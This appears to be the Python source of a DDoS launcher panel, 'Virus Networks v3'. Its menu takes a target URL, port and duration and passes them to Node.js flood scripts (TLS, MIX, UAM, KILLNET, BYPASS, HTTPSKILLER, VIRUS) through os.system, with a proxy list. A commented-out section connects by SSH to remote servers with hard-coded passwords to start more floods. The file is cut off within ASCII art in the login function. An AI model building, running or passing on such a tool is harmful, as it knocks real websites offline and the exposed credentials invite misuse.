# -*- coding: utf-8 -*-
from operator import index
from colorama import Fore, Back, Style, init
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs
import shutil
import time
from pystyle import Colorate, Colors, Center, Col
from colorama import Fore, init
import json
#import paramiko
# hanya visual [👇🏼]
bot1 = """1/5"""#🌚
bot2 = """Permanent"""#🌚
bot = "8"
server = "3"
adm = "true"
# hanya visual [👆🏼]

def methods():
    # Baca data dari file JSON
    with open('assets/methods.json', 'r') as file:
        methods_data = json.load(file)

    print(f"{'𝙼𝙴𝚃𝙷𝙾𝙳𝚂':<15} | {'𝙻𝟽':<50}")
    print('—' * 50)
    for method in methods_data:
        print(f"{method['𝙼𝙴𝚃𝙷𝙾𝙳𝚂']:<15}  {method['𝚍𝚎𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗']:<50}")


def error():
    print(Colorate.Vertical(Colors.DynamicMIX((Col.red, Col.red)),("""
𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝙽𝚘𝚝 𝙵𝚘𝚞𝚗𝚍 
- 𝚜𝚢𝚗𝚝𝚊𝚡 : <𝚖𝚎𝚝𝚑𝚘𝚍> <𝚞𝚛𝚕> <𝚙𝚘𝚛𝚝>  <𝚝𝚒𝚖𝚎>
- 𝚎𝚡𝚊𝚖𝚙𝚕𝚎 : 𝚃𝙻𝚂 𝚑𝚝𝚝𝚙𝚜://𝚎𝚡𝚊𝚖𝚙𝚕𝚎.𝚌𝚘𝚖 𝟺𝟺𝟹 𝟷𝟸𝟶

""")))

def help():
    print(f"""
[ 𝚖𝚎𝚝𝚑𝚘𝚍𝚜 ]   | 𝚟𝚒𝚎𝚠 𝚊𝚕𝚕 𝚖𝚎𝚝𝚑𝚘𝚍𝚜
[ 𝚌𝚕𝚜 ]       | 𝚛𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚝𝚑𝚎 𝚑𝚘𝚖𝚎 𝚖𝚎𝚗𝚞
[ 𝚕𝚊𝚢𝚎𝚛𝟽 ]    | 𝚍𝚎𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗 𝚘𝚏 𝚖𝚎𝚝𝚑𝚘𝚍𝚜 𝚕𝚊𝚢𝚎𝚛𝟽
[ 𝚕𝚊𝚢𝚎𝚛𝟺 ]    | 𝚍𝚎𝚜𝚌𝚛𝚒𝚙𝚝𝚒𝚘𝚗 𝚘𝚏 𝚖𝚎𝚝𝚑𝚘𝚍𝚜 𝚕𝚊𝚢𝚎𝚛𝟺
[ 𝚘𝚠𝚗𝚎𝚛 ]     | 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚊𝚍𝚖𝚒𝚗
""")

def l7():
    print("""
𝙻𝚊𝚢𝚎𝚛𝟽 - 𝚃𝚞𝚝𝚘𝚛𝚒𝚊𝚕
<𝚖𝚎𝚝𝚑𝚘𝚍𝚜> <𝚑𝚘𝚜𝚝> <𝚙𝚘𝚛𝚝> <𝚝𝚒𝚖𝚎>
""")

def l4():
    print("""𝙼𝚊𝚒𝚗𝚝𝚎𝚗𝚊𝚗𝚌𝚎""")
    
def admin():
    print("""
______________________
#𝙲𝚘𝚗𝚝𝚊𝚌𝚝 𝙾𝚠𝚗𝚎𝚛
𝚃𝚎𝚕𝚎 : @NCT_Help_bot
______________________""")
"""
def run_attack_vps3(url, port, time):
    # Konfigurasi SSH ke VPS ke-3
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Ganti ini dengan informasi VPS ke-3
    vps3_host = '1.1.1.1'
    vps3_port = 22
    vps3_user = 'ccuser'
    vps3_password = 'ch5q-vH54D#S0I'

    try:
        ssh.connect(vps3_host, port=vps3_port, username=vps3_user, password=vps3_password)
        command = f'cd .RAW && screen -dm timeout {time} node RAW.js {url} {time}'
        stdin, stdout, stderr = ssh.exec_command(command)
        #print(f"connect")
        ssh.close()
    except Exception as e:
        print(f"Failed to connect or execute command on serve 3: {str(e)}")

def run_attack_vps2(url, port, time):
    # Konfigurasi SSH ke VPS ke-2
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Ganti ini dengan informasi VPS ke-2
    vps2_host = '1.1.1.1'
    vps2_port = 22
    vps2_user = 'ccuser'
    vps2_password = 'B]Dr6p3q19MM+n'

    try:
        ssh.connect(vps2_host, port=vps2_port, username=vps2_user, password=vps2_password)
        command = f'cd .BOMB && screen -dm timeout {time} node BOMB.js {url} {time} 64 10'
        stdin, stdout, stderr = ssh.exec_command(command)
        print(f"Successful Attack On All Servers")
        ssh.close()
    except Exception as e:
        print(f"Failed to connect or execute command on server: {str(e)}")
"""
def main(username):
	sys.stdout.write(f"""\x1b]2;[\] 𝚛𝚘𝚘𝚝@𝚗𝚎𝚝 :: User: [{username}] :: Server: [online] :: Expired: [{bot2}] :: Version: [v3]\x07""")
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.red)),("""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣉⠙⢿⣿⣿⣿⡿⠟⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠂⢀⣿⣿⡟⠡⣾⣿⣷⠊⣻⣿⣿⣿⣿⣿⣿⡿⠇⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⠀⠀⢈⡉⢭⡤⠴⣿⣿⣾⠧⢤⠭⠍⠛⠿⢿⣿⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣴⣿⣦⢠⠐⢋⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣮⣟⢢⢁⣮⢡⣄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣏⠈⣿⡸⠿⣿⣷⣍⠀⣉⡛⠻⣿⣿⡿⠿⣿⣿⣟⣹⡿⡿⣋⣉⢃⣉⣾⣿⠿⢃⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠘⢋⡴⣻⣿⣿⣿⣿⣿⣿⢿⡟⠺⣦⣟⣷⠿⡟⠛⣯⣿⣿⣿⢿⣿⣯⡄⢻⣿⣿⣥⠇⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⡇⠀⠸⢸⣿⣿⣿⣿⣷⣼⣿⣿⣿⣧⣄⣨⣿⣏⣀⣹⣾⣿⣿⣷⣼⣿⣿⣿⣷⡌⢿⠟⠁⠴⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡷⠄⠀⠀⣿⣿⣿⣫⣭⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣿⣿⣿⣟⣿⣿⣿⣋⣿⣿⣿⣷⠀⠧⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⢰⣹⡒⠒⠛⣫⣤⣿⡯⣫⡿⣿⣿⣿⢙⣿⣟⣛⣿⣟⣛⣹⣿⣏⣿⣥⣿⣣⣿⣝⠛⢒⣞⣉⠀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣧⡘⠿⠿⠿⣿⣿⣿⣿⣷⢻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⢠⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣤⣾⣇⢻⣿⣿⣿⣿⣾⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⢻⣿⢿⣿⣿⣿⣿⣿⣿⣿⡏⢠⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⢿⣿⣿⣿⣿⣧⣿⡿⠟⣿⢾⡿⠻⢟⣩⣽⣿⣯⢿⣿⣿⣿⣿⣿⡟⢣⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡌⢻⣿⣿⣿⣿⣿⣿⣷⣗⢚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠡⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠙⠿⠏⣈⡙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣡⡘⠿⠏⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣯⣍⢹⣿⣿⡿⠉⢩⣥⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣈⠛⠛⢛⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿

""")))
	print(Colorate.Horizontal(Colors.DynamicMIX((Col.red, Col.red)),(""" 
	𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚃𝚘 𝚅𝚒𝚛𝚞𝚜 𝙽𝚎𝚝𝚠𝚘𝚛𝚔𝚜 𝚟𝟹""")))
	print(Colorate.Horizontal(Colors.DynamicMIX((Col.red, Col.red)),("""</> 𝚃𝚢𝚙𝚎 𝚑𝚎𝚕𝚙 </>
	
	
	
""")))
	while True:
		sin = input(f"""𝚛𝚘𝚘𝚝@𝚗𝚎𝚝 ~> """)
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main(username)
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main(username)
		
		if sinput == "menu" or sinput == "MENU":
		  methods()
		if sinput == "methods" or sinput == "METHODS":
		  methods()
		if sinput == "help" or sinput == "HELP":
		  help()
		if sinput == "LAYER7" or sinput == "layer7":
		  l7()
		if sinput == "LAYER4" or sinput == "layer4":
		  l4()
		if sinput == "owner" or sinput == "OWNER":
		  admin()
#method untuk layer 7 :)

    
		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd TLS && node TLS.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
			except ValueError:
				error()
			except IndexError:
				error()
		
				
		elif sinput == "MIX" or sinput == "mix":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd MIX && node MIX.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "UAM" or sinput == "uam":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd UAM && node UAM.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
				
		elif sinput == "KILLNET" or sinput == "killnet":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd KILLNET && node KILLNET.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd KILL && node KILL.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "BYPASS" or sinput == "bypass":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd BYPASS && node BYPASS.js {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
		elif sinput == "HTTPSKILLER" or sinput == "httpskiller":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd L7 && node HTTPSKILLER {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()
				
				
		elif sinput == "VIRUS" or sinput == "virus":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
				#os.system('clear')
				print(f"""
𝙰𝚝𝚝𝚊𝚌𝚔 𝙳𝚎𝚝𝚊𝚒𝚕𝚜

  𝚂𝚝𝚊𝚝𝚞𝚜:  \033[0m[\033[0m\033[31m𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢 𝚂𝚎𝚗𝚍 𝙰𝚝𝚝𝚊𝚌𝚔\033[0m\033[0m]\033[0m
  𝙷𝚘𝚜𝚝:    \033[0m[\033[31m{𝚞𝚛𝚕}\033[0m]\033[0m
  𝙿𝚘𝚛𝚝:    \033[0m[\033[31m{𝚙𝚘𝚛𝚝}\033[0m]\033[0m
  𝚃𝚒𝚖𝚎:    \033[0m[\033[31m{𝚝𝚒𝚖𝚎}\033[0m]\033[0m
  𝙼𝚎𝚝𝚑𝚘𝚍𝚜: \033[0m[\033[31m{𝚜𝚒𝚗𝚙𝚞𝚝}\033[0m]\033[0m
  𝚁𝚞𝚗𝚗𝚒𝚗𝚐: \033[0m[\033[31m{𝚜𝚝𝚊𝚛𝚝_𝚝𝚒𝚖𝚎}\033[0m]\033[0m
""")
				os.system(f'cd V7 && node VIRUS {url} {time} 64 10 proxy.txt')
				#run_attack_vps2(url, port, time)
				#run_attack_vps3(url, port, time)
				#os.system ("clear")
			except ValueError:
				error()
			except IndexError:
				error()

def login():
	os.system('cls' if os.name == 'nt' else 'clear')
	print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.red)),("""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣉⠙⢿⣿⣿⣿⡿⠟⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠂⢀⣿⣿⡟⠡⣾⣿⣷⠊⣻⣿⣿⣿⣿⣿⣿⡿⠇⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⠀⠀⢈⡉⢭⡤⠴⣿⣿⣾⠧⢤⠭⠍⠛⠿⢿⣿⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣴⣿⣦⢠⠐⢋⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣮⣟⢢⢁⣮⢡⣄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣏⠈⣿⡸⠿⣿⣷⣍⠀⣉⡛⠻⣿⣿⡿⠿⣿⣿⣟⣹⡿⡿⣋⣉⢃⣉⣾⣿⠿⢃⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠘⢋⡴⣻⣿⣿⣿⣿⣿⣿⢿⡟⠺⣦⣟⣷⠿⡟⠛⣯⣿⣿⣿⢿⣿⣯⡄⢻⣿⣿⣥⠇⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⡇⠀⠸⢸⣿⣿⣿⣿⣷⣼⣿⣿⣿⣧⣄⣨⣿⣏⣀⣹⣾⣿⣿⣷⣼⣿⣿⣿⣷⡌⢿⠟⠁⠴⢿⣿⣿⣿⣿⣿⣿⣿
